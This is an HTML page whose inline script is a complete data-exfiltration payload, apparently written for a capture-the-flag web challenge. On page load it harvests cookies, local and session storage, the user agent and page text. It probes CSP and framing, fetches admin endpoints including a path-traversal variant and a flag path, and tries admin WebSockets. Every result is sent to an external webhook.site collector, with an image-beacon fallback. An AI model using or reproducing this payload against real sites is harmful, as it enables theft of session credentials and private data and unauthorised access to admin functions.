<!doctype html>
<html>
<body>
<h1>Totally Not Suspicious Page</h1>

<script>
/* ---------------- CONFIG ---------------- */
const REC = "https://webhook.site/0f10c98d-9181-4a92-b57a-1eae97ed5a47/x=?";
const WS_TARGETS = [
  "wss://ce441-web.spchallenge.ir:8080/admin/ws",
  "ws://ce441-web.spchallenge.ir:8080/admin/ws",
  "wss://ce441-web.spchallenge.ir/admin/ws",
  "ws://ce441-web.spchallenge.ir/admin/ws"
];
const ADMIN_ENDPOINTS = [
  "/admin/tasks",
  "/admin/users",
  "/admin/",
  "/admin/logs",
  "/admin/settings",
  "/admin/flag",
  "/admin/../admin/tasks",
];

/* ---------------- HELPERS ---------------- */
function ex(msg){
  msg = "[EXFIL] " + msg;
  try { fetch(REC + encodeURIComponent(msg)); }
  catch(e){
    try { 
      let i=new Image(); 
      i.src=REC+encodeURIComponent("[FALLBACK IMG] "+msg); 
    } catch(_) {}
  }
}

function sniffAll(){
  let out = "";
  try { out += "cookies=" + document.cookie + "\n"; } catch(e){}
  try { out += "localStorage=" + JSON.stringify(localStorage) + "\n"; } catch(e){}
  try { out += "sessionStorage=" + JSON.stringify(sessionStorage) + "\n"; } catch(e){}
  try { out += "UA=" + navigator.userAgent + "\n"; } catch(e){}
  try { out += "screen=" + screen.width + "x" + screen.height + "\n"; } catch(e){}
  try { out += "body_text=" + document.body.innerText.slice(0,5000) + "\n"; } catch(e){}
  return out;
}

async function testCSP(){
  let res = "";
  try {
    const r = await fetch("/does_not_exist_for_csp_test",{method:"GET"});
    res = "fetch_allowed";
  } catch {
    res = "fetch_blocked_by_csp";
  }
  ex("CSP_TEST=" + res);
}

function testIframe(){
  try{
    if(window.top !== window.self) ex("IFRAME_DETECTED");
    else ex("NO_IFRAME");
  } catch(e){
    ex("IFRAME_CHECK_ERR="+e);
  }
}

async function bruteAdminEndpoints(){
  for(const p of ADMIN_ENDPOINTS){
    try{
      const r = await fetch(p);
      ex("ADMIN_FETCH "+p+" status="+r.status);
      const t = await r.text();
      ex("ADMIN_BODY "+p+" => "+t.slice(0,500));
    } catch(e){ 
      ex("ADMIN_FETCH_ERR "+p+" => "+e); 
    }
  }
}

async function testWS(){
  for(const url of WS_TARGETS){
    try {
      ex("TRY_WS " + url);
      let done = false;
      await new Promise((resolve)=>{
        let ws = new WebSocket(url);

        ws.onopen = ()=>{
          ex("WS_OPEN "+url);
          try { ws.send("flag"); ex("WS_SENT flag"); } catch(e){ ex("WS_SEND_ERR "+e); }
        };

        ws.onerror = e=>{
          ex("WS_ERROR "+url+" => "+e);
        };

        ws.onmessage = m=>{
          ex("WS_RECV "+url+" => "+m.data);
          done = true;
          ws.close();
          resolve();
        };

        setTimeout(()=>{
          if(!done){
            ex("WS_TIMEOUT "+url);
            try{ ws.close(); }catch(_){}
            resolve();
          }
        }, 2500);
      });
    } catch(e){
      ex("WS_EXCEPTION "+url+" => "+e);
    }
  }
}

/* ---------------- RUN EVERYTHING ---------------- */
(async function(){
  ex("START_EXFIL UA=" + navigator.userAgent);

  testIframe();
  await testCSP();

  ex("SNIFF:\n" + sniffAll());

  await bruteAdminEndpoints();
  await testWS();

  ex("DONE_ALL_TESTS");
})();
</script>
</body>
</html>
